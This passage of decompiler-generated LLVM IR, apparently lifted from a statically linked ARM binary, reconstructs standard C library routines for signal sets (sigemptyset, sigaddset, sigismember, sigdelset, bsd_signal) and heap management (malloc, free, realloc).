  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12504, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 128, i32* @r2, align 4
  %v0_12524 = load i32, i32* @r0, align 4
  %v2_12524 = inttoptr i32 %v0_12524 to i8*
  %v3_12524 = call i32 @__GI_memset(i8* %v2_12524, i32 0)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12530 = load i32, i32* @r4, align 4
  store i32 %v3_12530, i32* %stack_var_-12, align 4
  %v6_12530 = load i32, i32* @r5, align 4
  %v10_12530 = ptrtoint i32* %stack_var_-12 to i32
  %v7_12534 = icmp eq i32 %arg2, -1
  %v0_12540.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_12534, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_12558

bb:                                               ; preds = %entry
  %v2_1253c = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_12540.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_12540.pre, 1
  br i1 %tmp19, label %dec_label_pc_12558, label %dec_label_pc_12548

dec_label_pc_12548:                               ; preds = %bb
  %v7_1254c = icmp sgt i32 %v0_12540.pre, 64
  br i1 %v7_1254c, label %dec_label_pc_12558, label %bb20

bb20:                                             ; preds = %dec_label_pc_12548
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_1257c24 = add i32 %v10_12530, 124
  store i32 %v5_1257c24, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1256c

dec_label_pc_12558:                               ; preds = %.thread, %dec_label_pc_12548, %bb
  %v0_12558 = call i32 @__errno_location()
  store i32 %v0_12558, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12564 = inttoptr i32 %v0_12558 to i32*
  store i32 22, i32* %v2_12564, align 4
  %v0_125d8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_125d8

dec_label_pc_1256c:                               ; preds = %bb20, %dec_label_pc_1256c
  %v5_1257c25 = phi i32 [ %v5_1257c24, %bb20 ], [ %v5_1257c, %dec_label_pc_1256c ]
  %v2_12570 = add i32 %v5_1257c25, -136
  %v3_12570 = inttoptr i32 %v2_12570 to i32*
  store i32 0, i32* %v3_12570, align 4
  %v0_12574.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_12574 = add i32 %v0_12574.pre, -1
  store i32 %v1_12574, i32* %r0.global-to-local, align 4
  %v6_12574 = icmp slt i32 %v1_12574, 0
  %v4_1257c = mul i32 %v1_12574, 4
  %v5_1257c = add i32 %v4_1257c, %v10_12530
  store i32 %v5_1257c, i32* %r2.global-to-local, align 4
  br i1 %v6_12574, label %dec_label_pc_12584, label %dec_label_pc_1256c

dec_label_pc_12584:                               ; preds = %dec_label_pc_1256c
  %v2_12584 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_12584, i32* @r5, align 4
  %v2_12588 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_12588, i32* @r0, align 4
  %v0_1258c = load i32, i32* @r4, align 4
  store i32 %v0_1258c, i32* @r1, align 4
  %v0_12590 = call i32 @__sigaddset()
  store i32 %v0_12590, i32* %r0.global-to-local, align 4
  %v1_12594 = icmp slt i32 %v0_12590, 0
  br i1 %v1_12594, label %dec_label_pc_125d4, label %dec_label_pc_1259c

dec_label_pc_1259c:                               ; preds = %dec_label_pc_12584
  %v0_1259c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2a400.725 to i32), i32* %r0.global-to-local, align 4
  %v2_125a4 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_2a400.725 to i32), i32 %v0_1259c)
  store i32 %v2_1253c, i32* %r2.global-to-local, align 4
  %v0_125bc = load i32, i32* @r4, align 4
  store i32 %v0_125bc, i32* %r0.global-to-local, align 4
  %v4_125c4 = call i32 @__libc_sigaction(i32 %v0_125bc, i32* nonnull %stack_var_-152, i32 %v2_1253c)
  store i32 %v4_125c4, i32* %r0.global-to-local, align 4
  %v1_125c8 = icmp slt i32 %v4_125c4, 0
  br i1 %v1_125c8, label %dec_label_pc_125d4, label %bb23

bb23:                                             ; preds = %dec_label_pc_1259c
  %v5_125cc = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_125cc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_125d8

dec_label_pc_125d4:                               ; preds = %dec_label_pc_1259c, %dec_label_pc_12584
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_125d8

dec_label_pc_125d8:                               ; preds = %bb23, %dec_label_pc_12558, %dec_label_pc_125d4
  %v0_125d8 = phi i32 [ %v5_125cc, %bb23 ], [ %v0_125d8.pre, %dec_label_pc_12558 ], [ -1, %dec_label_pc_125d4 ]
  store i32 %v0_125d8, i32* %r0.global-to-local, align 4
  %v2_125e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_125e0, i32* @r4, align 4
  store i32 %v6_12530, i32* @r5, align 4
  ret i32 %v0_125d8

; uselistorder directives
  uselistorder i32 %v0_125d8, { 1, 0 }
  uselistorder i32 %v5_1257c, { 1, 0 }
  uselistorder i32 %v1_12574, { 0, 2, 1 }
  uselistorder i32 %v2_1253c, { 1, 0 }
  uselistorder i32 %v0_12540.pre, { 1, 0, 2 }
  uselistorder i32 %v10_12530, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_125d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1256c, { 1, 0 }
  uselistorder label %dec_label_pc_12558, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_125e8 = add i32 %arg2, -1
  %v3_125ec = udiv i32 %v1_125e8, 32
  %v4_125f0 = mul nuw nsw i32 %v3_125ec, 4
  %v5_125f0 = add i32 %v4_125f0, %arg1
  %v6_125f0 = inttoptr i32 %v5_125f0 to i32*
  %v7_125f0 = load i32, i32* %v6_125f0, align 4
  %v1_125f4 = urem i32 %v1_125e8, 32
  %v7_125fc = shl i32 1, %v1_125f4
  %v8_125fc = and i32 %v7_125f0, %v7_125fc
  %v10_125fc = icmp ne i32 %v8_125fc, 0
  %. = zext i1 %v10_125fc to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_125e8, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_1260c = load i32, i32* @r1, align 4
  %v1_1260c = add i32 %v0_1260c, -1
  %v3_12610 = udiv i32 %v1_1260c, 32
  %v0_12614 = load i32, i32* @r0, align 4
  %v4_12614 = mul nuw nsw i32 %v3_12610, 4
  %v5_12614 = add i32 %v0_12614, %v4_12614
  %v6_12614 = inttoptr i32 %v5_12614 to i32*
  %v7_12614 = load i32, i32* %v6_12614, align 4
  %v1_12618 = urem i32 %v1_1260c, 32
  %v7_12620 = shl i32 1, %v1_12618
  %v8_12620 = or i32 %v7_12614, %v7_12620
  store i32 %v8_12620, i32* %v6_12614, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1260c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12630 = add i32 %arg2, -1
  %v3_12634 = udiv i32 %v1_12630, 32
  %v4_12638 = mul nuw nsw i32 %v3_12634, 4
  %v5_12638 = add i32 %v4_12638, %arg1
  %v6_12638 = inttoptr i32 %v5_12638 to i32*
  %v7_12638 = load i32, i32* %v6_12638, align 4
  %v1_1263c = urem i32 %v1_12630, 32
  %tmp = shl i32 -1, %v1_1263c
  %v8_12644 = add i32 %tmp, -1
  %v9_12644 = and i32 %v7_12638, %v8_12644
  store i32 %v9_12644, i32* %v6_12638, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12630, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12654 = load i32, i32* @r4, align 4
  %v6_12654 = load i32, i32* @r5, align 4
  %v9_12654 = load i32, i32* @r6, align 4
  %v0_12658 = load i32, i32* %r0.global-to-local, align 4
  %v2_12658 = icmp eq i32 %v0_12658, 0
  %v2_1265c = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_12658, label %bb, label %dec_label_pc_12668

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12670

dec_label_pc_12668:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_12658, -8
  br i1 %tmp, label %dec_label_pc_12774, label %dec_label_pc_12670

dec_label_pc_12670:                               ; preds = %bb, %dec_label_pc_12668
  %v0_12670 = phi i32 [ %v0_12658, %dec_label_pc_12668 ], [ 1, %bb ]
  %v1_12670 = add i32 %v0_12670, 4
  store i32 %v1_12670, i32* %stack_var_-20, align 4
  store i32 %v2_1265c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2a390.727 to i32), i32* %r0.global-to-local, align 4
  %v1_12688 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_23f3c.731 to i32), i32* %r0.global-to-local, align 4
  %v3_12694 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_23f3c.731 to i32*), i32 %v2_1265c)
  store i32 %v3_12694, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a390.727 to i32), i32* %r0.global-to-local, align 4
  store i32 75436, i32* @lr, align 4
  %v1_126a8 = call i32 @__pthread_return_0()
  store i32 %v1_126a8, i32* %r0.global-to-local, align 4
  %v2_126ac = icmp eq i32 %v3_12694, 0
  br i1 %v2_126ac, label %dec_label_pc_126b4, label %dec_label_pc_12764

dec_label_pc_126b4:                               ; preds = %dec_label_pc_12670
  %v2_126b8 = load i32, i32* @global_var_2a3b8.578, align 4
  store i32 %v2_126b8, i32* @r4, align 4
  %v2_126bc = load i32, i32* %stack_var_-20, align 4
  %v3_126c0 = icmp ult i32 %v2_126bc, %v2_126b8
  br i1 %v3_126c0, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_126b4
  %v3_126c4 = add i32 %v2_126b8, -1
  %v2_126c8 = add i32 %v3_126c4, %v2_126bc
  %v2_126cc = sub i32 0, %v2_126b8
  %v3_126d0 = and i32 %v2_126c8, %v2_126cc
  store i32 %v3_126d0, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_126b4, %bb14
  store i32 ptrtoint (i32* @global_var_2a480.735 to i32), i32* %r0.global-to-local, align 4
  %v1_126dc = call i32 @__pthread_return_0()
  %v0_126e0 = load i32, i32* @r4, align 4
  store i32 %v0_126e0, i32* %r0.global-to-local, align 4
  %v1_126e4 = call i32 @__GI_sbrk(i32 %v0_126e0)
  store i32 %v1_126e4, i32* %r0.global-to-local, align 4
  %v7_126e8 = icmp eq i32 %v1_126e4, -1
  br i1 %v7_126e8, label %bb15, label %dec_label_pc_126f4

bb15:                                             ; preds = %.thread3
  store i32 %v1_126e4, i32* @r5, align 4
  br label %dec_label_pc_12708

dec_label_pc_126f4:                               ; preds = %.thread3
  %v1_126f4 = add i32 %v1_126e4, 3
  %v1_126f8 = and i32 %v1_126f4, -4
  store i32 %v1_126f8, i32* @r5, align 4
  %v9_126fc = icmp eq i32 %v1_126f8, %v1_126e4
  br i1 %v9_126fc, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_126f4
  %v3_12700 = sub i32 %v1_126f8, %v1_126e4
  store i32 %v3_12700, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_126f4, %bb16
  %v1_12704 = xor i1 %v9_126fc, true
  call void @__pseudo_cond_branch(i1 %v1_12704, i32 ptrtoint (i32* @global_var_13c9c.736 to i32))
  br label %dec_label_pc_12708

dec_label_pc_12708:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_2a480.735 to i32), i32* %r0.global-to-local, align 4
  store i32 75544, i32* @lr, align 4
  %v1_12714 = call i32 @__pthread_return_0()
  store i32 %v1_12714, i32* %r0.global-to-local, align 4
  %v0_12718 = load i32, i32* @r5, align 4
  %v7_12718 = icmp eq i32 %v0_12718, -1
  br i1 %v7_12718, label %dec_label_pc_12774, label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %dec_label_pc_12708
  store i32 ptrtoint (i32* @global_var_2a390.727 to i32), i32* %r0.global-to-local, align 4
  %v1_1272c = call i32 @__pthread_return_0()
  %v0_12730 = load i32, i32* @r4, align 4
  %v0_12734 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_23f3c.731 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_12734, 16777216
  %v2_1273c = sdiv i32 %sext, 16777216
  %v5_1273c = call i32 @__heap_free(i32* bitcast (i32** @global_var_23f3c.731 to i32*), i32 %v2_1273c, i32 %v0_12730)
  store i32 ptrtoint (i32** @global_var_23f3c.731 to i32), i32* %r0.global-to-local, align 4
  %v3_12748 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_23f3c.731 to i32*), i32 %v2_1265c)
  store i32 %v3_12748, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a390.727 to i32), i32* %r0.global-to-local, align 4
  store i32 75612, i32* @lr, align 4
  %v1_12758 = call i32 @__pthread_return_0()
  store i32 %v1_12758, i32* %r0.global-to-local, align 4
  %v2_1275c = icmp eq i32 %v3_12748, 0
  br i1 %v2_1275c, label %dec_label_pc_12774, label %dec_label_pc_12764

dec_label_pc_12764:                               ; preds = %dec_label_pc_12670, %dec_label_pc_12720
  %v1_12768 = phi i32 [ %v3_12694, %dec_label_pc_12670 ], [ %v3_12748, %dec_label_pc_12720 ]
  %v2_12764 = load i32, i32* %stack_var_-20, align 4
  %v2_12768 = inttoptr i32 %v1_12768 to i32*
  store i32 %v2_12764, i32* %v2_12768, align 4
  %v3_12768 = load i32, i32* %r4.global-to-local, align 4
  %v4_12768 = add i32 %v3_12768, 4
  store i32 %v4_12768, i32* %r4.global-to-local, align 4
  %v2_1276c = icmp eq i32 %v4_12768, 0
  br i1 %v2_1276c, label %dec_label_pc_12774, label %dec_label_pc_12784

dec_label_pc_12774:                               ; preds = %dec_label_pc_12764, %dec_label_pc_12720, %dec_label_pc_12708, %dec_label_pc_12668
  %v0_12774 = call i32 @__errno_location()
  store i32 %v0_12774, i32* %r0.global-to-local, align 4
  %v2_1277c = inttoptr i32 %v0_12774 to i32*
  store i32 12, i32* %v2_1277c, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12784

dec_label_pc_12784:                               ; preds = %dec_label_pc_12764, %dec_label_pc_12774
  %v0_12784 = phi i32 [ %v4_12768, %dec_label_pc_12764 ], [ 0, %dec_label_pc_12774 ]
  store i32 %v0_12784, i32* %r0.global-to-local, align 4
  store i32 %v3_12654, i32* @r4, align 4
  store i32 %v6_12654, i32* @r5, align 4
  store i32 %v9_12654, i32* @r6, align 4
  ret i32 %v0_12784

; uselistorder directives
  uselistorder i32 %v0_12784, { 1, 0 }
  uselistorder i32 %v3_12748, { 1, 0, 2 }
  uselistorder i32 %v1_126f8, { 1, 0, 2 }
  uselistorder i32 %v1_126e4, { 3, 0, 2, 4, 1, 5 }
  uselistorder i32 %v3_12694, { 1, 0, 2 }
  uselistorder i32 %v0_12658, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 4, 6, 8, 9, 10, 3, 12, 11, 16, 14, 13, 2, 15, 17, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_12784, { 1, 0 }
  uselistorder label %dec_label_pc_12764, { 1, 0 }
  uselistorder label %dec_label_pc_12708, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_12670, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_127a8 = load i32, i32* @r0, align 4
  %v2_127a8 = icmp eq i32 %v0_127a8, 0
  %v3_127ac = load i32, i32* @r4, align 4
  store i32 %v3_127ac, i32* %stack_var_-24, align 4
  %v6_127ac = load i32, i32* @r5, align 4
  %v9_127ac = load i32, i32* @r6, align 4
  %v15_127ac = load i32, i32* @r8, align 4
  br i1 %v2_127a8, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_127b4 = add i32 %v0_127a8, -4
  %v2_127b4 = inttoptr i32 %v1_127b4 to i32*
  %v3_127b4 = load i32, i32* %v2_127b4, align 4
  store i32 %v3_127b4, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_23f3c.731 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_127b4, i32* @r4, align 4
  %v1_127cc = call i32 @__pthread_return_0()
  %v0_127d0 = load i32, i32* @r4, align 4
  %v0_127d4 = load i32, i32* @r5, align 4
  %v4_127dc = call i32 @__heap_free(i32* bitcast (i32** @global_var_23f3c.731 to i32*), i32 %v0_127d0, i32 %v0_127d4)
  %v1_127e4 = inttoptr i32 %v4_127dc to i32*
  %v2_127e4 = load i32, i32* %v1_127e4, align 4
  store i32 %v2_127e4, i32* %r6.global-to-local, align 4
  %v2_127e8 = load i32, i32* @global_var_2a3b8.578, align 4
  %v4_127ec = mul i32 %v2_127e8, 8
  %v6_127ec = icmp ult i32 %v2_127e4, %v4_127ec
  store i32 %v4_127dc, i32* @r4, align 4
  br i1 %v6_127ec, label %dec_label_pc_1282c, label %dec_label_pc_127f8

dec_label_pc_127f8:                               ; preds = %bb11
  %v1_12800 = call i32 @__pthread_return_0()
  %v1_12808 = call i32 @__GI_sbrk(i32 0)
  %v0_1280c = load i32, i32* @r4, align 4
  %v1_1280c = add i32 %v0_1280c, 12
  store i32 %v1_1280c, i32* @r5, align 4
  %v9_12810 = icmp eq i32 %v1_1280c, %v1_12808
  br i1 %v9_12810, label %dec_label_pc_12834, label %dec_label_pc_12818

dec_label_pc_12818:                               ; preds = %dec_label_pc_127f8
  %v1_12824 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1282c

dec_label_pc_1282c:                               ; preds = %bb11, %dec_label_pc_12818, %bb14
  %v2_1282c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1282c, i32* @r4, align 4
  store i32 %v6_127ac, i32* @r5, align 4
  store i32 %v9_127ac, i32* %r6.global-to-local, align 4
  store i32 %v15_127ac, i32* %r8.global-to-local, align 4
  %v0_12830 = call i32 @__pthread_return_0()
  %v0_12834.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12834

dec_label_pc_12834:                               ; preds = %dec_label_pc_127f8, %dec_label_pc_1282c
  %v1_1283c = phi i32 [ %v0_1280c, %dec_label_pc_127f8 ], [ %v0_12834.pre, %dec_label_pc_1282c ]
  %v1_12834 = add i32 %v1_1283c, 4
  %v2_12834 = inttoptr i32 %v1_12834 to i32*
  %v3_12834 = load i32, i32* %v2_12834, align 4
  %v2_12838 = icmp eq i32 %v3_12834, 0
  br i1 %v2_12838, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_12834
  %v2_1283c = add i32 %v1_1283c, 8
  %v3_1283c = inttoptr i32 %v2_1283c to i32*
  %v4_1283c = load i32, i32* %v3_1283c, align 4
  %v3_12840 = add i32 %v3_12834, 8
  %v4_12840 = inttoptr i32 %v3_12840 to i32*
  store i32 %v4_1283c, i32* %v4_12840, align 4
  %v0_12844.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12834, %bb12
  %v0_12844 = phi i32 [ %v1_1283c, %dec_label_pc_12834 ], [ %v0_12844.pre, %bb12 ]
  %v1_12844 = add i32 %v0_12844, 8
  %v2_12844 = inttoptr i32 %v1_12844 to i32*
  %v3_12844 = load i32, i32* %v2_12844, align 4
  %v1_12848 = add i32 %v0_12844, 4
  %v2_12848 = inttoptr i32 %v1_12848 to i32*
  %v3_12848 = load i32, i32* %v2_12848, align 4
  %v2_1284c = icmp eq i32 %v3_12844, 0
  br i1 %v2_1284c, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_12850 = add i32 %v3_12844, 4
  %v4_12850 = inttoptr i32 %v3_12850 to i32*
  store i32 %v3_12848, i32* %v4_12850, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_12854 = load i32, i32* %r8.global-to-local, align 4
  %v3_12854 = inttoptr i32 %v2_12854 to i32*
  store i32 %v3_12848, i32* %v3_12854, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_12864 = call i32 @__pthread_return_0()
  %v0_12868 = load i32, i32* %r6.global-to-local, align 4
  %v1_12868 = load i32, i32* @r4, align 4
  %v0_12870 = load i32, i32* @r5, align 4
  %v2_12868 = sub i32 12, %v0_12868
  %v1_1286c = add i32 %v2_12868, %v1_12868
  %v2_12870 = sub i32 %v1_1286c, %v0_12870
  %v1_12874 = call i32 @__GI_sbrk(i32 %v2_12870)
  br label %dec_label_pc_1282c

; uselistorder directives
  uselistorder i32 %v0_12844, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_12834, { 1, 0 }
  uselistorder label %dec_label_pc_1282c, { 2, 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12898 = load i32, i32* @r4, align 4
  store i32 %v3_12898, i32* %stack_var_-24, align 4
  %v6_12898 = load i32, i32* @r5, align 4
  %v9_12898 = load i32, i32* @r6, align 4
  %v12_12898 = load i32, i32* @r7, align 4
  %v15_12898 = load i32, i32* @r8, align 4
  %v18_12898 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_1289c = icmp eq i32 %arg2, 0
  %v0_128a0 = load i32, i32* @r0, align 4
  store i32 %v0_128a0, i32* @r7, align 4
  br i1 %v2_1289c, label %dec_label_pc_128a8, label %dec_label_pc_128b0

dec_label_pc_128a8:                               ; preds = %entry
  %v0_128a8 = call i32 @free()
  %v0_128b8.pre = load i32, i32* @r4, align 4
  %v2_128bc.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_128b8

dec_label_pc_128b0:                               ; preds = %entry
  %v2_128b0 = icmp eq i32 %v0_128a0, 0
  br i1 %v2_128b0, label %dec_label_pc_128b8, label %dec_label_pc_128c4

dec_label_pc_128b8:                               ; preds = %dec_label_pc_128b0, %dec_label_pc_128a8
  %v2_128bc = phi i32 [ %v3_12898, %dec_label_pc_128b0 ], [ %v2_128bc.pre, %dec_label_pc_128a8 ]
  %v0_128b8 = phi i32 [ %arg2, %dec_label_pc_128b0 ], [ %v0_128b8.pre, %dec_label_pc_128a8 ]
  store i32 %v2_128bc, i32* @r4, align 4
  store i32 %v6_12898, i32* @r5, align 4
  store i32 %v9_12898, i32* @r6, align 4
  store i32 %v12_12898, i32* @r7, align 4
  store i32 %v18_12898, i32* @lr, align 4
  %v1_128c0 = call i32 @malloc(i32 %v0_128b8)
  %v0_128c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_128c4

dec_label_pc_128c4:                               ; preds = %dec_label_pc_128b0, %dec_label_pc_128b8
  %v0_128dc = phi i32 [ %v0_128a0, %dec_label_pc_128b0 ], [ %v1_128c0, %dec_label_pc_128b8 ]
  %v0_128c4 = phi i32 [ %arg2, %dec_label_pc_128b0 ], [ %v0_128c4.pre, %dec_label_pc_128b8 ]
  %v1_128c4 = add i32 %v0_128c4, 7
  %v1_128c8 = and i32 %v1_128c4, -4
  store i32 %v1_128c8, i32* @r5, align 4
  %v2_128cc = icmp ugt i32 %v1_128c8, 10
  %v1_128d0 = add i32 %v0_128dc, -4
  %v2_128d0 = inttoptr i32 %v1_128d0 to i32*
  %v3_128d0 = load i32, i32* %v2_128d0, align 4
  store i32 %v3_128d0, i32* @r6, align 4
  br i1 %v2_128cc, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_128c4
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_128c4, %bb
  %v0_12958 = phi i32 [ %v1_128c8, %dec_label_pc_128c4 ], [ 12, %bb ]
  store i32 %v1_128d0, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_12958, %v3_128d0
  br i1 %tmp, label %dec_label_pc_128e4, label %dec_label_pc_12958

dec_label_pc_128e4:                               ; preds = %bb14
  %v2_128d8 = sub i32 %v0_12958, %v3_128d0
  %v1_128f4 = call i32 @__pthread_return_0()
  %v0_128fc = load i32, i32* @r8, align 4
  %v1_128fc = load i32, i32* @r6, align 4
  %v2_128fc = add i32 %v1_128fc, %v0_128fc
  %v4_12904 = call i32 @__heap_alloc_at(i32* bitcast (i32** @global_var_23f3c.731 to i32*), i32 %v2_128fc, i32 %v2_128d8)
  store i32 %v4_12904, i32* @r4, align 4
  store i32 76060, i32* @lr, align 4
  %v1_12918 = call i32 @__pthread_return_0()
  %v0_1291c = load i32, i32* @r4, align 4
  %v2_1291c = icmp eq i32 %v0_1291c, 0
  br i1 %v2_1291c, label %dec_label_pc_1292c, label %.thread

.thread:                                          ; preds = %dec_label_pc_128e4
  %v1_12920 = load i32, i32* @r6, align 4
  %v3_12920 = add i32 %v1_12920, %v0_1291c
  %v2_12924 = load i32, i32* @r7, align 4
  %v3_12924 = add i32 %v2_12924, -4
  %v4_12924 = inttoptr i32 %v3_12924 to i32*
  store i32 %v3_12920, i32* %v4_12924, align 4
  br label %dec_label_pc_12998

dec_label_pc_1292c:                               ; preds = %dec_label_pc_128e4
  %v0_1292c = load i32, i32* @r5, align 4
  %v1_1292c = add i32 %v0_1292c, -4
  %v1_12930 = call i32 @malloc(i32 %v1_1292c)
  store i32 %v1_12930, i32* @r0, align 4
  store i32 %v1_12930, i32* @r4, align 4
  %v2_12934 = icmp eq i32 %v1_12930, 0
  br i1 %v2_12934, label %dec_label_pc_12950, label %dec_label_pc_1293c

dec_label_pc_1293c:                               ; preds = %dec_label_pc_1292c
  %v0_1293c = load i32, i32* @r6, align 4
  %v1_1293c = add i32 %v0_1293c, -4
  store i32 %v1_1293c, i32* @r2, align 4
  %v0_12940 = load i32, i32* @r7, align 4
  store i32 %v0_12940, i32* @r1, align 4
  %v0_12944 = call i32 @memcpy()
  %v0_12948 = load i32, i32* @r7, align 4
  store i32 %v0_12948, i32* @r0, align 4
  %v0_1294c = call i32 @free()
  %v0_12950.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12950

dec_label_pc_12950:                               ; preds = %dec_label_pc_1292c, %dec_label_pc_1293c
  %v0_12950 = phi i32 [ 0, %dec_label_pc_1292c ], [ %v0_12950.pre, %dec_label_pc_1293c ]
  store i32 %v0_12950, i32* @r7, align 4
  br label %dec_label_pc_12998

dec_label_pc_12958:                               ; preds = %bb14
  %v1_12958 = add i32 %v0_12958, 28
  %tmp15 = icmp ugt i32 %v1_12958, %v3_128d0
  br i1 %tmp15, label %dec_label_pc_12998, label %dec_label_pc_12964

dec_label_pc_12964:                               ; preds = %dec_label_pc_12958
  %v1_12970 = call i32 @__pthread_return_0()
  %v0_12974 = load i32, i32* @r8, align 4
  %v1_12974 = load i32, i32* @r5, align 4
  %v2_12974 = add i32 %v1_12974, %v0_12974
  %v1_12978 = load i32, i32* @r6, align 4
  %v2_12978 = sub i32 %v1_12978, %v1_12974
  %v4_12980 = call i32 @__heap_free(i32* bitcast (i32** @global_var_23f3c.731 to i32*), i32 %v2_12974, i32 %v2_12978)
  store i32 76180, i32* @lr, align 4
  %v1_12990 = call i32 @__pthread_return_0()
  %v0_12994 = load i32, i32* @r5, align 4
  %v1_12994 = load i32, i32* @r7, align 4
  %v2_12994 = add i32 %v1_12994, -4
  %v3_12994 = inttoptr i32 %v2_12994 to i32*
  store i32 %v0_12994, i32* %v3_12994, align 4
  br label %dec_label_pc_12998

dec_label_pc_12998:                               ; preds = %.thread, %dec_label_pc_12958, %dec_label_pc_12950, %dec_label_pc_12964
  %v0_12998 = load i32, i32* @r7, align 4
  store i32 %v9_12898, i32* @r6, align 4
  store i32 %v15_12898, i32* @r8, align 4
  ret i32 %v0_12998

; uselistorder directives
  uselistorder i32 %v1_12974, { 1, 0 }
  uselistorder i32 %v0_12958, { 1, 2, 0 }
  uselistorder i32 %v3_128d0, { 0, 2, 1, 3 }
  uselistorder i32** @global_var_23f3c.731, { 1, 0 }
